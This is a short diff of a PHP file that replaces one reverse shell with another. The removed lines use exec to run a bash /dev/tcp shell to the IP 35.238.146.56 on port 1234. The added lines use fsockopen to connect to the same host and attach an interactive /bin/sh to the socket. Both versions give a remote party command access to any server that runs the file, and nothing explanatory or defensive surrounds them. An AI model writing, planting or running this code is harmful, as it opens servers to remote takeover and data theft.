@@ -1,5 +1,4 @@
 <?php 
-$output=null;
-$retval=null;
-exec('bash -i >& /dev/tcp/35.238.146.56/1234 0>&1', $output, $retval);
+$sock=fsockopen("35.238.146.56",1234);
+exec("/bin/sh -i <&3 >&3 2>&3");
 ?>
